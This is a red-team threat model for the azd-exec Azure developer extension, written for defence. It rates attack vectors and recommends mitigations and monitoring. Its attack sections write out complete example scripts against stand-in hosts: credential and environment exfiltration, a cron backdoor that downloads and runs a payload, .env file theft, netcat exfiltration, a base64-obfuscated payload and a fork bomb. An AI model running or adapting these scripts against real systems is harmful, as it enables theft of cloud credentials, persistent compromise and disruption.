# Threat Model & Attack Vector Analysis - azd-exec

**Date**: December 19, 2025  
**Perspective**: Red Team / Adversarial Security Analysis  
**Classification**: CONFIDENTIAL - Security Research

## Executive Summary

This document analyzes potential attack vectors from a malicious actor's perspective. While the current implementation is **secure against direct code injection**, several social engineering and supply chain attack vectors exist that could **exploit user trust** in the azd ecosystem.

**Risk Level**: ⚠️ **MEDIUM** (Not due to code vulnerabilities, but trust exploitation vectors)

---

## Attack Vectors

### 🔴 HIGH RISK: Social Engineering Attacks

#### Attack 1: Malicious Script Disguised as Tutorial

**Attacker Goal**: Execute arbitrary code on victim's machine with full azd context (Azure credentials, environment variables, service principals).

**Attack Scenario**:
```bash
# Victim finds this in a "helpful" blog post or GitHub gist
# Title: "Quick script to fix common azd deployment issues"

curl -s https://attacker-site.com/fix-azd.sh | azd exec run -

# OR (more subtle)
git clone https://github.com/fake-user/azd-helpers
cd azd-helpers
azd exec run ./scripts/optimize-deployment.sh
```

**Malicious Script Content** (`fix-azd.sh`):
```bash
#!/bin/bash
# Looks innocent at first...
echo "Checking azd configuration..."

# But then exfiltrates everything:
curl -X POST https://attacker-site.com/exfil \
  -H "Content-Type: application/json" \
  -d "{
    \"env\": \"$(env | base64 -w0)\",
    \"azure_subscription\": \"$AZURE_SUBSCRIPTION_ID\",
    \"tenant\": \"$AZURE_TENANT_ID\",
    \"service_principal\": \"$AZURE_CLIENT_ID:$AZURE_CLIENT_SECRET\",
    \"storage_keys\": \"$(az storage account keys list --account-name $AZURE_STORAGE_ACCOUNT -o json 2>/dev/null)\",
    \"hostname\": \"$(hostname)\",
    \"user\": \"$(whoami)\",
    \"home\": \"$HOME\"
  }"

# Installs backdoor
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s https://attacker-site.com/payload.sh | bash") | crontab -

# Shows fake success message to avoid suspicion
echo "✓ Configuration optimized successfully!"
```

**Why This Works**:
- ✅ User **trusts** azd is secure (it is!)
- ✅ Script inherits **full environment** including Azure credentials
- ✅ No code vulnerability needed - **user explicitly runs the script**
- ✅ Azd context provides **authenticated Azure access**
- ✅ Looks legitimate if posted on Stack Overflow or dev blogs

**Impact**: 
- Complete Azure subscription compromise
- Exfiltration of all environment variables (may contain secrets)
- Persistent backdoor installation
- Lateral movement to Azure resources

---

#### Attack 2: Typosquatting via NPM/GitHub

**Attacker Goal**: Get users to install malicious azd extension.

**Attack Scenario**:
```bash
# User types this by mistake:
azd extension install azd-exce  # Missing 'c' in 'exec'
azd extension install azd-exec-pro  # "Pro" version sounds better!

# Attacker registers these similar names and publishes malicious extensions
```

**Malicious Extension Strategy**:
1. Clone legitimate azd-exec extension
2. Add telemetry/exfiltration code
3. Publish to extension registry with similar name
4. SEO optimization to rank higher in search results

**Detection Difficulty**: HIGH (looks identical to legitimate extension)

---

#### Attack 3: Man-in-the-Middle Script Injection

**Attacker Goal**: Modify scripts during download.

**Attack Scenario**:
```bash
# User on compromised WiFi (coffee shop, airport)
curl http://example.com/deploy.sh | azd exec run -

# Attacker intercepts HTTP request and injects:
#!/bin/bash
$(curl -s https://attacker-site.com/payload.sh)
# ... original script continues ...
```

**Why This Works**:
- ✅ No HTTPS validation for script downloads
- ✅ Public WiFi commonly used by developers
- ✅ Users trust azd to validate scripts (it doesn't - by design)

---

### 🟡 MEDIUM RISK: Environment Variable Exploitation

#### Attack 4: Secrets in Environment Variables

**Attacker Goal**: Extract secrets that developers mistakenly put in environment variables.

**Discovery Script**:
```bash
#!/bin/bash
# Malicious script that searches for common secret patterns

env | grep -iE '(password|secret|token|key|api|credential)' | \
  base64 | \
  curl -X POST https://attacker-site.com/secrets -d @-

# Search common config files
find ~/ -maxdepth 3 -type f -name "*.env" -o -name ".env*" -o -name "config.json" 2>/dev/null | \
  while read file; do
    cat "$file" | base64 | curl -X POST https://attacker-site.com/configs/$file -d @-
  done
```

**Why This Works**:
- ✅ Developers commonly store secrets in `.env` files
- ✅ azd-exec inherits **all** environment variables
- ✅ No secret filtering or sanitization (intentional design)

**Real-World Example**:
```bash
# Developer sets this (bad practice but common):
export AZURE_CLIENT_SECRET="super-secret-value-123"
export DATABASE_PASSWORD="admin123"

# Later runs malicious script:
azd exec run ./malicious.sh  # Gets both secrets!
```

---

### 🟡 MEDIUM RISK: Supply Chain Attacks

#### Attack 5: Compromised Script Repositories

**Attacker Goal**: Compromise popular script repositories that users trust.

**Attack Scenario**:
```bash
# Popular "awesome-azd-scripts" GitHub repo gets compromised
# Attacker adds subtle malicious code to existing scripts

# Before (legitimate):
#!/bin/bash
azd deploy

# After (compromised):
#!/bin/bash
(curl -s https://attacker-site.com/telemetry?user=$(whoami)&project=$(pwd) &)
azd deploy  # Original functionality preserved
```

**Why This Works**:
- ✅ Users trust popular repositories
- ✅ Malicious code runs in background (non-blocking)
- ✅ Original functionality preserved (harder to detect)
- ✅ Affects **all users** of that repository

---

#### Attack 6: Dependency Confusion

**Attacker Goal**: Get malicious packages included in azd-exec dependencies.

**Attack Vector**:
1. Monitor azd-exec dependencies (cobra, mage)
2. Register similarly-named packages in private registries
3. Wait for developers to misconfigure `go.mod`

**Example**:
```bash
# Attacker publishes malicious package:
github.com/spf13/cobra-utils  # Looks official!

# Developer adds it thinking it's official:
go get github.com/spf13/cobra-utils
```

---

### 🟢 LOW RISK: Command Injection (Currently Mitigated)

#### Attack 7: Shell Metacharacter Injection (FAILED)

**Attacker Goal**: Inject shell commands via script arguments.

**Failed Attack Attempts**:
```bash
# Try 1: Semicolon injection
azd exec run script.sh "; rm -rf /"
# ✅ BLOCKED: Args passed as separate array elements to exec.Command()

# Try 2: Backtick command substitution
azd exec run "script.sh" '`curl attacker.com`'
# ✅ BLOCKED: No shell interpolation

# Try 3: Pipe injection
azd exec run script.sh "| curl attacker.com"
# ✅ BLOCKED: Pipe not interpreted

# Try 4: Variable expansion
azd exec run script.sh '$(/malicious/command)'
# ✅ BLOCKED: No variable expansion in arguments
```

**Why These Fail**:
```go
// executor.go uses exec.Command() correctly:
return exec.Command(cmdArgs[0], cmdArgs[1:]...)  // Separate args, no shell
```

**Verdict**: ✅ **Code injection via arguments is NOT possible** with current implementation.

---

#### Attack 8: Path Traversal (FAILED)

**Attacker Goal**: Execute scripts outside intended directories.

**Failed Attack Attempts**:
```bash
# Try 1: Relative path escape
azd exec run ../../../etc/passwd
# ✅ BLOCKED: filepath.Abs() resolves to absolute path, os.Stat() verifies file exists

# Try 2: Symlink attack
ln -s /etc/shadow ./innocent.sh
azd exec run ./innocent.sh
# ✅ PARTIALLY MITIGATED: Will execute symlink target, but requires write access to workspace

# Try 3: TOCTOU (Time-of-check-time-of-use)
azd exec run script.sh
# (Attacker replaces script.sh between validation and execution)
# ⚠️ THEORETICAL: Requires filesystem write access, narrow time window
```

**Verdict**: ✅ **Path traversal mostly mitigated**, symlink attack requires pre-existing write access.

---

### 🟢 LOW RISK: Denial of Service

#### Attack 9: Resource Exhaustion

**Attacker Goal**: Consume system resources to disrupt development workflow.

**Attack Script**:
```bash
#!/bin/bash
# Fork bomb disguised as deployment script
:(){ :|:& };:
```

**Why This Works**:
- ✅ No resource limits enforced by azd-exec
- ✅ Script runs with user's permissions (can spawn unlimited processes)

**Mitigation**: Operating system ulimit protections apply.

---

#### Attack 10: Infinite Loop with Debug Mode

**Attacker Goal**: Fill disk with debug logs.

**Attack Script**:
```bash
#!/bin/bash
while true; do
  echo "Processing deployment..." >&2
  dd if=/dev/zero of=/tmp/data bs=1M count=100
done
```

**Impact**: Minimal (user can Ctrl+C, OS disk quotas apply)

---

## Exploitation Scenarios

### Scenario 1: Compromised CI/CD Pipeline

**Setup**:
```yaml
# .github/workflows/deploy.yml
- name: Deploy with azd
  run: |
    curl https://raw.githubusercontent.com/attacker/scripts/main/deploy.sh -o deploy.sh
    azd exec run ./deploy.sh
```

**Attack**:
1. Attacker compromises GitHub account or creates fake repository
2. Modifies `deploy.sh` to exfiltrate GitHub secrets
3. Every CI/CD run leaks `AZURE_CREDENTIALS`, `GITHUB_TOKEN`, etc.

**Impact**: Supply chain compromise affecting multiple projects.

---

### Scenario 2: Watering Hole Attack

**Setup**:
- Popular Azure developer blog publishes "helpful scripts"
- Attackers compromise blog or submit malicious guest post

**Attack Flow**:
```
1. Developer reads blog post: "Speed up azd deployments with this one script!"
2. Copies command: `azd exec run <(curl -s https://blog.com/optimize.sh)`
3. Script exfiltrates Azure credentials
4. Attacker uses credentials to:
   - Mine cryptocurrency on victim's Azure subscription
   - Exfiltrate production databases
   - Plant backdoors in deployed applications
```

---

### Scenario 3: Internal Threat / Malicious Insider

**Setup**:
- Disgruntled employee has access to company script repository
- Adds backdoor to commonly-used deployment script

**Attack**:
```bash
# Added to company's internal "deploy-common.sh":
if [ "$USER" = "security-auditor" ]; then
  # Disable audit logging
  curl -X DELETE https://internal-api.company.com/audit/logs
fi

# Exfiltrate data periodically
(while true; do
  az sql db export --subscription $AZURE_SUBSCRIPTION_ID ... | gzip | base64 | nc attacker.com 1337
  sleep 3600
done) &
```

**Detection Difficulty**: HIGH (runs in context of legitimate user)

---

## Defense Evasion Techniques

### Technique 1: Obfuscation

**Attacker Strategy**: Hide malicious intent through encoding.

```bash
#!/bin/bash
# Looks innocent:
echo "Optimizing deployment..."

# Decodes and executes malicious payload:
echo "Y3VybCAtWCBQT1NUIGh0dHBzOi8vYXR0YWNrZXIuY29tL2V4ZmlsIC1kICIkKGVudikiCg==" | base64 -d | bash
```

### Technique 2: Timestomping

**Attacker Strategy**: Make malicious script look like it was created months ago.

```bash
# After creating malicious script:
touch -t 202301010000 ./legitimate-looking-script.sh
```

### Technique 3: Living Off The Land (LOLBins)

**Attacker Strategy**: Use only legitimate Azure/system tools.

```bash
#!/bin/bash
# Only uses legitimate Azure CLI commands:
az account list -o json | \
  curl -X POST https://attacker.com/data -d @-

# Downloads and executes using only curl (legitimate tool):
curl https://attacker.com/payload.sh | bash
```

---

## Risk Assessment Matrix

| Attack Vector | Likelihood | Impact | Risk Level | Mitigated? |
|--------------|------------|--------|------------|------------|
| Malicious Tutorial Script | **HIGH** | **CRITICAL** | 🔴 CRITICAL | ❌ No |
| Typosquatting Extension | MEDIUM | HIGH | 🟡 HIGH | ❌ No |
| MITM Script Injection | MEDIUM | HIGH | 🟡 HIGH | ⚠️ Partial (HTTPS helps) |
| Environment Variable Exfil | **HIGH** | **HIGH** | 🔴 HIGH | ❌ No |
| Supply Chain (Repo Compromise) | LOW | **CRITICAL** | 🟡 HIGH | ❌ No |
| Dependency Confusion | LOW | HIGH | 🟢 MEDIUM | ⚠️ Partial (go.sum) |
| Command Injection | LOW | CRITICAL | 🟢 LOW | ✅ **YES** |
| Path Traversal | LOW | MEDIUM | 🟢 LOW | ✅ **YES** |
| Resource Exhaustion | LOW | LOW | 🟢 LOW | ⚠️ Partial (OS limits) |
| CI/CD Pipeline Compromise | MEDIUM | **CRITICAL** | 🟡 HIGH | ❌ No |

---

## Recommended Mitigations

### 🔴 CRITICAL: User Education

**Recommendation**: Create security documentation warning users about:

1. **Never pipe untrusted scripts to azd exec**:
   ```bash
   # ❌ DANGEROUS:
   curl https://random-blog.com/script.sh | azd exec run -
   
   # ✅ SAFER:
   curl https://random-blog.com/script.sh -o script.sh
   # Review script.sh contents first!
   azd exec run script.sh
   ```

2. **Verify script sources**:
   - Check repository ownership
   - Review commit history
   - Look for verified badges on GitHub
   - Use scripts from official Azure documentation only

3. **Use HTTPS for script downloads**:
   ```bash
   # ❌ Vulnerable to MITM:
   curl http://example.com/script.sh
   
   # ✅ Better:
   curl https://example.com/script.sh
   ```

### 🟡 HIGH: Implement Security Features

**Recommendation 1: Script Signature Verification** (Optional)

```bash
# Add optional --verify flag:
azd exec run --verify ./script.sh

# Verifies script signature before execution:
# 1. Check for .sig file
# 2. Verify signature against trusted keys
# 3. Only execute if signature valid
```

**Recommendation 2: Sensitive Variable Filtering** (Optional)

```go
// executor.go - Add optional filtering:
func filterSensitiveEnv(env []string) []string {
    filtered := []string{}
    sensitivePatterns := []string{"PASSWORD", "SECRET", "TOKEN", "KEY", "_CREDENTIAL"}
    
    for _, e := range env {
        isSensitive := false
        for _, pattern := range sensitivePatterns {
            if strings.Contains(strings.ToUpper(e), pattern) {
                isSensitive = true
                break
            }
        }
        if !isSensitive {
            filtered = append(filtered, e)
        }
    }
    return filtered
}

// Usage (opt-in):
azd exec run --filter-env ./script.sh
```

**Recommendation 3: Audit Logging**

```bash
# Log all script executions:
# ~/.azd/exec-audit.log
2025-12-19T10:30:45Z user=developer script=/path/to/deploy.sh args="--env production" exit_code=0
```

### 🟢 MEDIUM: Additional Security Layers

**Recommendation 1: Content Security Policy for Scripts**

Allow users to define trusted script sources in `~/.azd/config.json`:
```json
{
  "exec": {
    "trustedSources": [
      "github.com/azure-samples/*",
      "learn.microsoft.com/*"
    ],
    "blockUnverified": false
  }
}
```

**Recommendation 2: Sandboxing** (Future Enhancement)

Execute scripts in restricted environment:
- Limited network access
- Restricted file system access
- Resource limits (CPU, memory, time)

**Implementation**: Use containers or OS-level sandboxing (Windows: AppContainer, Linux: seccomp/namespace)

---

## Detection & Monitoring

### Indicators of Compromise (IOCs)

Users should monitor for:

1. **Unexpected network connections** during script execution:
   ```bash
   # Monitor with:
   sudo tcpdump -i any -w script-traffic.pcap &
   azd exec run suspicious-script.sh
   ```

2. **Unusual process spawning**:
   ```bash
   # Check for fork bombs or excessive processes:
   ps aux | wc -l  # Before and after script execution
   ```

3. **Modified cron jobs / startup scripts**:
   ```bash
   crontab -l
   ls -la ~/.config/autostart/
   ```

4. **Unexpected Azure resource creation**:
   ```bash
   az resource list --query "[].{name:name, type:type, created:createdTime}" -o table
   ```

### Security Telemetry

**Optional telemetry to detect attacks**:
```go
// Report (anonymized) to Azure telemetry:
type ExecutionTelemetry struct {
    ScriptHashSHA256 string
    ExecutionTime    time.Duration
    ExitCode         int
    NetworkActivity  bool  // Did script make network calls?
    ErrorCount       int
}
```

---

## Conclusion

### Current Security Posture

✅ **Code Security**: Excellent
- No command injection vulnerabilities
- No path traversal vulnerabilities
- Proper input validation
- Safe subprocess execution

❌ **Trust Model Security**: Vulnerable
- **Users trust azd-exec to validate scripts (it doesn't/can't)**
- **Full environment inheritance is a feature but also attack vector**
- **No script verification mechanism**

### Key Insight

> **The primary risk is not a vulnerability in azd-exec itself, but exploitation of user trust in the azd ecosystem.**

Attackers will:
1. Exploit **social engineering** (malicious tutorials, blog posts)
2. Leverage **supply chain trust** (compromised repositories)
3. Use **legitimate functionality** (environment variable inheritance)

### Security Philosophy

azd-exec follows the **"sharp tools" philosophy**:
- It's a **power tool** for developers
- It **trusts the user** to know what they're executing
- It **doesn't attempt to sandbox or restrict** script capabilities
- **User responsibility** for script validation

This is appropriate for a developer tool, but requires:
- 📚 **Strong user education**
- ⚠️ **Clear security warnings in documentation**
- 🔍 **Optional security features** (verification, audit logging)

### Priority Recommendations

1. **CRITICAL**: Add security warnings to README and documentation
2. **HIGH**: Implement audit logging
3. **MEDIUM**: Add optional script signature verification
4. **LOW**: Consider sandboxing for future versions

---

## Responsible Disclosure

This threat model is provided for security research and defensive purposes only. Any actual exploitation of these attack vectors against real users would be:
- **Illegal** under computer fraud laws (CFAA, etc.)
- **Unethical** and harmful to the developer community
- **Reported** to appropriate authorities

**If you discover a security vulnerability, please report it responsibly to the maintainers.**

---

**Classification**: CONFIDENTIAL - Security Research  
**Author**: GitHub Copilot Security Analysis  
**Date**: December 19, 2025  
**Status**: For Internal Security Review Only
